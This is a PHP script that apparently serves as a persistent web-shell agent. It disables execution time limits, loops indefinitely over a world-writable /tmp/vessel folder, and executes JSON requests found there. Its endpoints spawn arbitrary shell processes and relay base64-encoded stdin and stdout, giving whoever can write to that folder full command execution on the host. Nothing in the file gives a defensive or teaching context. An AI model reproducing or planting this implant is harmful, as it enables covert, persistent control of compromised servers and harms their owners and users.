<?php
ignore_user_abort(true);
set_time_limit(0);

$PREFIX = "vessel";
$folder = "/tmp/vessel";

mkdir($folder, 0777, true);

$endpoints = array();

function hello($args)
{
    return "hi";
}
$endpoints["hello"] = "hello";

function version($args)
{
    return "0.0.1";
}
$endpoints["version"] = "version";

$child_shells = [];

function spawn_child_shell($args)
{
    global $child_shells;
    if (!function_exists("proc_open")) {
        throw new Exception("Error: proc_open not exists");
    }
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $cwd = getcwd();
    $env = array();
    $proc = proc_open($args[0], $descriptorspec, $pipes, $cwd, $env);
    if (!is_resource($proc)) {
        throw new Exception("Error: spawn failed");
    }
    $child_shells[] = [
        "proc" => $proc,
        "pipes" => $pipes
    ];
    return key($child_shells);
}
$endpoints["spawn_child_shell"] = "spawn_child_shell";

function child_shell_write_stdin($args)
{
    global $child_shells;
    $pipes = $child_shells[$args[0]]["pipes"];
    $ret = fwrite($pipes[0], base64_decode($args[1]));
    fflush($pipes[0]);
    return $ret;
}

$endpoints["child_shell_write_stdin"] = "child_shell_write_stdin";

function child_shell_read_stdout($args)
{
    global $child_shells;
    $pipes = $child_shells[$args[0]]["pipes"];
    return base64_encode(fread($pipes[1], $args[1]));
}

$endpoints["child_shell_read_stdout"] = "child_shell_read_stdout";

function child_shell_close_pipe($args)
{
    global $child_shells;
    $pipes = $child_shells[$args[0]]["pipes"];
    fclose($pipes[$args[1]]);
}
$endpoints["child_shell_close_pipe"] = "child_shell_close_pipe";


function child_shell_exit($args)
{
    global $child_shells;
    $proc = $child_shells[$args[0]]["proc"];
    $pipes = $child_shells[$args[0]]["pipes"];
    unset($child_shells[$args[0]]);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    return proc_close($proc);
}

$endpoints["child_shell_exit"] = "child_shell_exit";


while (is_dir($folder . "/")) {
    foreach (scandir($folder) as $filename) {
        if ($filename == "." || $filename == "..") {
            continue;
        }
        $filepath = "$folder/$filename";
        $matches = null;
        if (preg_match("/^vessel_([a-z0-9]+)_req/", $filename, $matches)) {
            $reqid = $matches[1];
            $content = file_get_contents($filepath);
            @unlink($filepath);
            $data = null;
            try {
                $data = json_decode($content);
            } catch (Exception $e) {
                continue;
            }
            $resp = null;
            try {
                $resp = $endpoints[$data->fn]($data->args);
            } catch (Exception $e) {
                file_put_contents("$folder/{$PREFIX}_{$reqid}_resp", json_encode([
                    "reqid" => $reqid,
                    "code" => -100,
                    "msg" => $e->getMessage(),
                ]));
            }
            try {
                file_put_contents("$folder/{$PREFIX}_{$reqid}_resp", json_encode([
                    "reqid" => $reqid,
                    "code" => 0,
                    "resp" => $resp,
                ]));
            } catch (Exception $e) {
                echo $e;
            }
        }
    }
    usleep(5000);
    // php would cache is_dir, clear it
    clearstatcache();
}
